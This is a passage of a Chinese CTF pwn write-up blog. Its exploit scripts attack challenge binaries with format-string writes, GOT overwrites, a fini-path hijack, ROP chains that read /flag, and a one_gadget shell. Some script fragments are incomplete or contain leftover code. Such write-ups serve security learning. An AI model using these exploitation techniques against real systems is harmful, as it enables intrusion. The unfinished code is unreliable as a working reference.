class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    openat_addr = libc.sym[<span class="string">&#x27;openat&#x27;</span>]</span><br><span class="line">    exit_got = elf.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">    printf_addr = libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    stack_check_got = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">    setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">    main_addr = <span class="number">0x401571</span></span><br><span class="line">    main_addr_without_sub_stack = <span class="number">0x4015B9</span><span class="comment">#0x401571 </span></span><br><span class="line">    prctl_got = elf.got[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">    leave_ret = libc.address + <span class="number">0x4da83</span></span><br><span class="line">    <span class="comment"># return</span></span><br><span class="line"></span><br><span class="line">    ret_8 =  libc.address + <span class="number">0xaa2da</span></span><br><span class="line"></span><br><span class="line">    ret_16 = libc.address + <span class="number">0x2a312</span></span><br><span class="line">    read_into_address(exit_got, p64(ret_8)[:<span class="number">4</span>])</span><br><span class="line">    read_into_address(exit_got+<span class="number">4</span>, p64(ret_8)[<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">    <span class="comment"># return</span></span><br><span class="line">    read_into_address(stack_check_got, p32(main_addr_without_sub_stack))</span><br><span class="line">    read_into_address(setvbuf_got,p64(openat_addr)[:<span class="number">4</span>])</span><br><span class="line">    <span class="comment"># second cicle</span></span><br><span class="line">    read_into_address(prctl_got,p64(openat_addr)[:<span class="number">4</span>])</span><br><span class="line">    read_into_address(exit_got, p64(leave_ret+<span class="number">1</span>)[:<span class="number">4</span>])</span><br><span class="line">    read_into_address(stack_check_got, p32(main_addr))</span><br><span class="line">    <span class="comment"># third cicle</span></span><br><span class="line">    read_into_address(stack_check_got, p32(main_addr_without_sub_stack))</span><br><span class="line">    read_into_address(exit_got, p64(ret_8)[:<span class="number">4</span>])</span><br><span class="line">    read_into_address(atoi_got, p64(printf_addr)[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">format</span> = <span class="string">b&#x27;%p%p&#x27;</span></span><br><span class="line">    read_format(<span class="built_in">format</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    leak_stack_addr = <span class="built_in">int</span>(ru(<span class="string">b&#x27;0x&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">    leak(<span class="string">&#x27;leak_stack_addr&#x27;</span>,leak_stack_addr)</span><br><span class="line">    <span class="comment"># 0x000000000002a3e5 : pop rdi ; ret</span></span><br><span class="line">    <span class="comment"># 0x000000000002be5 1 : pop rsi ; ret</span></span><br><span class="line">    <span class="comment"># 0x00000000000904a9 : pop rdx ; pop rbx ; ret</span></span><br><span class="line">    <span class="comment"># 当 rdx &lt; rcx 不跳转</span></span><br><span class="line">    <span class="comment"># 0x000000000005a272 : mov rdi, rax ; cmp rdx, rcx ; jae 0x5a25c ; mov rax, r8 ; ret</span></span><br><span class="line">    <span class="comment"># 0x000000000003d1ee : pop rcx ; ret</span></span><br><span class="line">    pop_rdi_ret = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">    pop_rsi_ret = libc.address + <span class="number">0x2be51</span></span><br><span class="line">    pop_rdx_rbx_ret = libc.address + <span class="number">0x904a9</span></span><br><span class="line">    mov_rdi_rax = libc.address + <span class="number">0x5a272</span></span><br><span class="line">    pop_rcx_ret = libc.address + <span class="number">0x3d1ee</span></span><br><span class="line">    <span class="comment"># 0x00000000000aa2da : ret 8</span></span><br><span class="line">    ret_8 = <span class="number">0xaa2da</span></span><br><span class="line">    ret_addr_of_main = leak_stack_addr + <span class="number">0x88</span></span><br><span class="line">    read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;ret_addr_of_main&#x27;</span>,ret_addr_of_main)</span><br><span class="line"></span><br><span class="line">    rop_chain = [pop_rdi_ret,<span class="number">0</span>,pop_rsi_ret,leak_stack_addr,pop_rdx_rbx_ret,<span class="number">0</span>,<span class="number">0</span>,pop_rcx_ret,<span class="number">0</span>,openat_addr,</span><br><span class="line">                 pop_rcx_ret,<span class="number">0xffffffff</span>,mov_rdi_rax,pop_rsi_ret,leak_stack_addr+<span class="number">0x10</span>,pop_rdx_rbx_ret,<span class="number">0x30</span>,<span class="number">0</span>,read_plt,</span><br><span class="line">                 pop_rdi_ret,<span class="number">1</span>,pop_rsi_ret,leak_stack_addr+<span class="number">0x10</span>,pop_rdx_rbx_ret,<span class="number">0x30</span>,<span class="number">0</span>,write_addr]</span><br><span class="line">    <span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop_chain)):</span><br><span class="line">        format_attack(ret_addr_of_main+i*<span class="number">8</span>,rop_chain[i],<span class="number">12</span>,<span class="number">22</span>)</span><br><span class="line">    read_format(<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;3. Exit\n&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)  </span><br></pre></td></tr></table></figure>

<h3 id="Remake"><a href="#Remake" class="headerlink" title="Remake"></a>Remake</h3><p>一次读写且缓冲区为0x10大小的格式化字符串漏洞利用</p>
<p>if判断，如果标志位为一，一个缓冲区大小为0x300的格式化字符串漏洞函数</p>
<p>然后此时标志位为0判断必然失败</p>
<p>最后会将标志位由零置一，程序结束</p>
<p>一次读写的格式化字符串漏洞利用，但是NX保护开启，无法修改fini array</p>
<p>但是本题人为的将main的地址写入了.data.rel.ro段，因此可以修改保存在栈上&lt;_rtld_global&gt; 劫持fini流程到main</p>
<p>思路：</p>
<p>①修改保存在栈上&lt;_rtld_global&gt; 劫持fini到main，得以让标志位为1进入格式化字符串漏洞函数2</p>
<p>②main的第一个printf泄露地址</p>
<p>③第二个printf修改main函数返回值为ongadget并布局栈+0x70的位置为0（其实可以不用，因为调用ongadget时rsp+0x70位置已经是0）</p>
<p>思考过程：</p>
<p>拿到题目没什么思路，只能格式化字符串一次，fini arrary不能直接写，没有写权限，</p>
<p>断到fini执行的函数开头，发现了libc调用ld调用该函数的调用链，定位到了这里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00007F</span>FFF7DD748E                 mov     esi, ebp</span><br><span class="line">.text:<span class="number">00007F</span>FFF7DD7490                 mov     rdi, r13</span><br><span class="line">.text:<span class="number">00007F</span>FFF7DD7493 ; <span class="number">67</span>:             v15(v14, status);</span><br><span class="line">.text:<span class="number">00007F</span>FFF7DD7493                 call    rax</span><br></pre></td></tr></table></figure>

<p>继续向上回溯找到rax赋值语句，找到了一个存放在栈上会被用来调用定位fini逻辑的偏移量</p>
<p><img src="/1763435254333-3.png" alt="img"></p>
<p>而这个题又正好在查看main的交叉引用的时候发现有两个，除了libcstartmain还有个：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.fini_array:<span class="number">0000555555557</span>DA0                               ; ELF Termination Function Table</span><br><span class="line">.fini_array:<span class="number">0000555555557</span>DA0                               ; ===========================================================================</span><br><span class="line">.fini_array:<span class="number">0000555555557</span>DA0</span><br><span class="line">.fini_array:<span class="number">0000555555557</span>DA0                               ; Segment type: Pure data</span><br><span class="line">.fini_array:<span class="number">0000555555557</span>DA0                               ; Segment permissions: Read/Write</span><br><span class="line">.fini_array:<span class="number">0000555555557</span>DA0                               _fini_array     segment qword public <span class="string">&#x27;DATA&#x27;</span> use64</span><br><span class="line">.fini_array:<span class="number">0000555555557</span>DA0                                               assume cs:_fini_array</span><br><span class="line">.fini_array:<span class="number">0000555555557</span>DA0                                               ;org <span class="number">555555557</span>DA0h</span><br><span class="line">.fini_array:<span class="number">0000555555557</span>DA0 <span class="number">60</span> <span class="number">51</span> <span class="number">55</span> <span class="number">55</span> <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>                       dq offset sub_555555555160</span><br><span class="line">.fini_array:<span class="number">0000555555557</span>DA0                               _fini_array     ends</span><br><span class="line">.fini_array:<span class="number">0000555555557</span>DA0</span><br><span class="line">.data.rel.ro:<span class="number">0000555555557</span>DA8                               ; ===========================================================================</span><br><span class="line">.data.rel.ro:<span class="number">0000555555557</span>DA8</span><br><span class="line">.data.rel.ro:<span class="number">0000555555557</span>DA8                               ; Segment type: Pure data</span><br><span class="line">.data.rel.ro:<span class="number">0000555555557</span>DA8                               ; Segment permissions: Read/Write</span><br><span class="line">.data.rel.ro:<span class="number">0000555555557</span>DA8                               _data_rel_ro    segment qword public <span class="string">&#x27;DATA&#x27;</span> use64</span><br><span class="line">.data.rel.ro:<span class="number">0000555555557</span>DA8                                               assume cs:_data_rel_ro</span><br><span class="line">.data.rel.ro:<span class="number">0000555555557</span>DA8                                               ;org <span class="number">555555557</span>DA8h</span><br><span class="line">.data.rel.ro:<span class="number">0000555555557</span>DA8 <span class="number">79</span> <span class="number">52</span> <span class="number">55</span> <span class="number">55</span> <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>                       dq offset main</span><br><span class="line">.data.rel.ro:<span class="number">0000555555557</span>DA8                               _data_rel_ro    ends</span><br><span class="line">.data.rel.ro:<span class="number">0000555555557</span>DA8</span><br></pre></td></tr></table></figure>

<p>那么把存放程序基址位置的低二位改成08就可（注意最终不是每次每次都会成功，不知道哪里会崩溃）</p>
<p>利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)  </span><br><span class="line">    <span class="comment"># step 1 修改保存在栈上&lt;_rtld_global&gt; 劫持fini到main</span></span><br><span class="line">    value = <span class="number">0x08</span></span><br><span class="line">    format1 = <span class="string">f&#x27;%<span class="subst">&#123;value&#125;</span>c%30$hhn--\n&#x27;</span>.encode()</span><br><span class="line">    s(format1)</span><br><span class="line">    ru(<span class="string">b&#x27;--&#x27;</span>)</span><br><span class="line">    <span class="comment"># step 2 泄露地址</span></span><br><span class="line">    format2 = <span class="string">b&#x27;%p%3$p%4$p%p\n&#x27;</span></span><br><span class="line">    s(format2)</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    proc_base = <span class="built_in">int</span>(ru(<span class="string">b&#x27;0x&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x4080</span></span><br><span class="line">    libc.address = <span class="built_in">int</span>(ru(<span class="string">b&#x27;0x&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x12</span> - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    rbp_of_main = <span class="built_in">int</span>(ru(<span class="string">b&#x27;0x&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) -<span class="number">0x10</span></span><br><span class="line">    leak(<span class="string">&#x27;proc_base&#x27;</span>,proc_base)</span><br><span class="line">    leak(<span class="string">&#x27;libc_base&#x27;</span>,libc.address)</span><br><span class="line">    leak(<span class="string">&#x27;rbp_of_main&#x27;</span>,rbp_of_main)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step 3 修改main函数返回值为ongadget</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#     &gt; one_gadget ./libc.so.6         </span></span><br><span class="line">    <span class="comment"># 0xebc81 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line">    <span class="comment"># constraints:</span></span><br><span class="line">    <span class="comment">#   address rbp-0x78 is writable</span></span><br><span class="line">    <span class="comment">#   [r10] == NULL || r10 == NULL || r10 is a valid argv</span></span><br><span class="line">    <span class="comment">#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line">    </span><br><span class="line">    onegadget = libc.address + <span class="number">0xebc81</span></span><br><span class="line">    value = onegadget&amp;<span class="number">0xffff</span> </span><br><span class="line">    leak(<span class="string">&#x27;onegadget&#x27;</span>,onegadget)</span><br><span class="line">    format3 = <span class="string">f&#x27;%11$hn&#x27;</span>.encode()</span><br><span class="line">    <span class="comment"># 注意：这里写$n会失败</span></span><br><span class="line">    format3 += <span class="string">f&#x27;%<span class="subst">&#123; value&#125;</span>c%12$hn&#x27;</span>.encode()</span><br><span class="line">    value = ((onegadget&gt;&gt;  <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - value</span><br><span class="line">    format3 += <span class="string">f&#x27;%<span class="subst">&#123; value&#125;</span>c%13$hn&#x27;</span>.encode()</span><br><span class="line">    format3 = format3.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    format3 += p64(rbp_of_main+<span class="number">0x8</span>+<span class="number">0x70</span>)</span><br><span class="line">    format3 += p64(rbp_of_main+<span class="number">0x8</span>)</span><br><span class="line">    format3 += p64(rbp_of_main+<span class="number">0xa</span>)</span><br><span class="line"></span><br><span class="line">    format3+=<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">    s(format3)</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;PWN漏洞利用脚本&#x27;</span>)</span><br><span class="line">    <span class="comment"># 网络参数（可选，调试模式时不需要）</span></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;ip&#x27;</span>, nargs=<span class="string">&#x27;?&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;目标IP地址&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;port&#x27;</span>, nargs=<span class="string">&#x27;?&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&#x27;目标端口号&#x27;</span>)</span><br><span class="line">    <span class="comment"># 调试选项</span></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--debug&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, choices=[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>], default=<span class="number">1</span>,<span class="built_in">help</span>=<span class="string">&#x27;调试模式: 1-本地进程(默认), 0-远程, 2-GDB调试&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="comment"># pwn(args)</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># print(hex(pwn(args)))</span></span><br><span class="line">            a = <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            do_nothing = <span class="number">1</span></span><br><span class="line">        i +=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(lis)</span><br></pre></td></tr></table></figure>

<h3 id="message"><a href="#message" class="headerlink" title="message"></a>message</h3><p>题目介绍</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Message Management System</span><br><span class="line"><span class="bullet">1.</span> Create a template</span><br><span class="line"><span class="bullet">2.</span> Delete a template</span><br><span class="line"><span class="bullet">3.</span> Create a message</span><br><span class="line"><span class="bullet">4.</span> Show messages</span><br><span class="line"><span class="bullet">5.</span> Create a note</span><br><span class="line"><span class="bullet">6.</span> Show a note</span><br><span class="line"><span class="bullet">7.</span> Delete a note</span><br><span class="line"><span class="bullet">8.</span> Edit a note</span><br><span class="line"><span class="bullet">9.</span> Exit</span><br><span class="line">Choice:</span><br></pre></td></tr></table></figure>

<p>template是解析json数据</p>
<p>解题过程：</p>
<p>恢复结构体</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="keyword">struct</span> <span class="title class_">Template</span> <span class="comment">// sizeof=0x40</span></span><br><span class="line"><span class="number">00000000</span> &#123;</span><br><span class="line"><span class="number">00000000</span>     <span class="type">char</span> *addr;</span><br><span class="line"><span class="number">0000000</span>8     <span class="type">char</span> *bak_chunk_addr;</span><br><span class="line"><span class="number">00000010</span>     <span class="type">char</span> *prev_chunk_addr;</span><br><span class="line"><span class="number">0000001</span>8     intWithPadding type;</span><br><span class="line"><span class="number">00000020</span>     <span class="type">char</span> *string_chunk_addr;</span><br><span class="line"><span class="number">0000002</span>8     intWithPadding int_num;</span><br><span class="line"><span class="number">00000030</span>     <span class="type">double</span> double_num;</span><br><span class="line"><span class="number">0000003</span>8     <span class="type">char</span> *objectOrArray_addr;</span><br><span class="line"><span class="number">00000040</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> <span class="keyword">struct</span> <span class="title class_">Parse</span> <span class="comment">// sizeof=0x38</span></span><br><span class="line"><span class="number">00000000</span> &#123;</span><br><span class="line"><span class="number">00000000</span>     <span class="type">char</span> *raw_content_addr;</span><br><span class="line"><span class="number">0000000</span>8     <span class="type">unsigned</span> __int64 total_len;</span><br><span class="line"><span class="number">00000010</span>     <span class="type">unsigned</span> __int64 parsed_len;</span><br><span class="line"><span class="number">0000001</span>8     __int64 parsed_list_item_num;</span><br><span class="line"><span class="number">00000020</span>     HookList hookList;</span><br><span class="line"><span class="number">0000003</span>8 &#125;;</span><br></pre></td></tr></table></figure>

<p>推的合理输入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content =  &#123;<span class="string">&quot;author&quot;</span>:&#123;<span class="string">&quot;lens&quot;</span>:<span class="number">8</span>&#125;,</span><br><span class="line">            <span class="string">&quot;content&quot;</span>:&#123;<span class="string">&quot;lens&quot;</span>:<span class="number">32</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;text&quot;</span>&#125;,</span><br><span class="line">            <span class="string">&quot;extensions&quot;</span>:[<span class="string">&quot;receivers&quot;</span>,<span class="string">&quot;time&quot;</span>,<span class="string">&quot;priority&quot;</span>]</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="OldWine"><a href="#OldWine" class="headerlink" title="OldWine"></a>OldWine</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    <span class="keyword">if</span>  sla(<span class="string">b&#x27;2. stack pivoting\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>)) == <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    sla(<span class="string">b&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    s(content)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_pivot</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;2. stack pivoting\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;2. stack pivoting\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so&quot;</span>, checksec=<span class="literal">False</span>) </span><br><span class="line">    rbp = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(elf.sym[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(elf.sym[<span class="string">&#x27;write&#x27;</span>]))</span><br><span class="line">    <span class="comment"># payload = p64(rbp) + p64()</span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="comment"># 0x000055555555546D mov edi, 1</span></span><br><span class="line">    mov_edi_1 = <span class="number">0x000055555555546D</span></span><br><span class="line">    write_stack(<span class="number">0x10</span>,<span class="number">100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    stack_pivot()</span><br><span class="line">    </span><br><span class="line">    rsp_div_8 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> write_stack(<span class="number">0x8</span>*i,<span class="number">0x20</span>,<span class="string">b&#x27;\x6d&#x27;</span>):</span><br><span class="line">            rsp_div_8 = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    s(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    proc_base = uu64(r(<span class="number">8</span>)) -  <span class="number">0x146d</span> - <span class="number">0xa</span></span><br><span class="line">    libc.address = uu64(r(<span class="number">8</span>)) - <span class="number">0x2a1ca</span></span><br><span class="line">    leak(<span class="string">&#x27;proc_base&#x27;</span>,proc_base)</span><br><span class="line">    leak(<span class="string">&#x27;libc_base&#x27;</span>,libc.address)</span><br><span class="line">    stack_leak = uu64(r(<span class="number">8</span>))</span><br><span class="line">    leak(<span class="string">&#x27;stack_leak&#x27;</span>,stack_leak)</span><br><span class="line">    bss = proc_base +<span class="number">0x4100</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0x000000000010f75b : pop rdi ; ret</span></span><br><span class="line">    pop_rdi_ret = libc.address + <span class="number">0x10f75b</span></span><br><span class="line">    <span class="comment"># 0x0000000000110a4d : pop rsi ; ret</span></span><br><span class="line">    pop_rsi_ret = libc.address + <span class="number">0x110a4d</span></span><br><span class="line">    <span class="comment"># 0x00000000000dd237 : pop rax ; ret</span></span><br><span class="line">    pop_rax_ret = libc.address + <span class="number">0xdd237</span></span><br><span class="line">    <span class="comment"># 0x00000000000b503c : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span></span><br><span class="line">    pop_rdx_rbx_r12_r13_rbp_ret = libc.address + <span class="number">0xb503c</span></span><br><span class="line">    <span class="comment"># 0x00000000000a877e : pop rcx ; ret</span></span><br><span class="line">    pop_rcx_ret = libc.address + <span class="number">0xa877e</span></span><br><span class="line">    <span class="comment"># 0x000000000005f036 : mov rdi, rax ; cmp rdx, rcx ; jae 0x5f020 ; mov rax, rsi ; ret</span></span><br><span class="line">    mov_rdi_rax_ret = libc.address + <span class="number">0x5f036</span></span><br><span class="line">    <span class="comment"># 98fd5syscall ret  </span></span><br><span class="line">    <span class="comment"># leak(&#x27;sycall&#x27;,syscall)</span></span><br><span class="line">    syscall_ret = libc.address + <span class="number">0x98fd5</span></span><br><span class="line">    <span class="comment"># return</span></span><br><span class="line">    open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    rsp = stack_leak - <span class="number">0x48</span></span><br><span class="line">    flag_addr = rsp + (<span class="number">20</span> *<span class="number">8</span>)</span><br><span class="line">    <span class="comment"># 直接用libc 的 open 函数 ，open函数结束的时候会对rdx进行操作，所以这里用rax设置系统调用号为2调用open</span></span><br><span class="line">    payload = p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(syscall_ret)</span><br><span class="line">    payload += p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(flag_addr+<span class="number">8</span>)+p64(read_addr)</span><br><span class="line">    payload += p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(flag_addr+<span class="number">8</span>)+p64(write_addr)</span><br><span class="line">    write_stack(<span class="number">8</span>*(rsp_div_8+<span class="number">20</span>),<span class="number">6</span>,<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">    write_stack(<span class="number">8</span>*rsp_div_8 - <span class="number">8</span>,<span class="number">200</span>,payload)</span><br></pre></td></tr></table></figure>

<h3 id="Ezvm"><a href="#Ezvm" class="headerlink" title="Ezvm"></a>Ezvm</h3><p>程序是一个虚拟机，提供xor、or、and、进位加，所有操作数均位于一个256大小的位图中</p>
